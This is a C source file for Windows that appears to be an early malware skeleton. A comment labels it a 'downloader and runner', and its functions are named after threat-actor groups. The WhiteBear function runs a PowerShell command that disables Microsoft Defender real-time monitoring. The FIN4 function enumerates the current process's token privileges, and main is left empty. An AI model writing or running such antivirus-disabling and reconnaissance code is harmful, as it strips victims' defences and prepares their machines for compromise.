#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


int main(){

}

//=================================================== make downloader and runner
int WhiteBear(){
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    // The command you want to run
    LPCSTR cmd = "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true";

    if (CreateProcessA(
            NULL,
            (LPSTR)cmd,
            NULL,
            NULL,
            FALSE,
            0,
            NULL,
            NULL,
            &si,
            &pi))
    {
        // Wait for the command to finish
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Cleanup
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
    }

    return 0;
}

char** FIN4(DWORD* outCount){
     *outCount = 0;    // default return count
    HANDLE token;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return NULL;

    DWORD len = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &len);

    TOKEN_PRIVILEGES* priv = (TOKEN_PRIVILEGES*)malloc(len);
    if (!priv) {
        CloseHandle(token);
        return NULL;
    }

    if (!GetTokenInformation(token, TokenPrivileges, priv, len, &len)) {
        free(priv);
        CloseHandle(token);
        return NULL;
    }

    DWORD count = priv->PrivilegeCount;
    char** list = (char**)malloc(count * sizeof(char*));
    if (!list) {
        free(priv);
        CloseHandle(token);
        return NULL;
    }

    for (DWORD i = 0; i < count; i++)
    {
        LUID_AND_ATTRIBUTES la = priv->Privileges[i];

        char name[256];
        DWORD nameLen = sizeof(name);

        if (!LookupPrivilegeNameA(NULL, &la.Luid, name, &nameLen)) {
            list[i] = _strdup("UNKNOWN_PRIVILEGE");
        } else {
            // Allocate "Name : ENABLED"/"DISABLED"
            char enabledText[16];
            snprintf(enabledText, sizeof(enabledText),
                     (la.Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");

            size_t totalLen = strlen(name) + strlen(enabledText) + 5;
            list[i] = (char*)malloc(totalLen);
            snprintf(list[i], totalLen, "%s : %s", name, enabledText);
        }
    }

    free(priv);
    CloseHandle(token);

    *outCount = count;
    return list;
}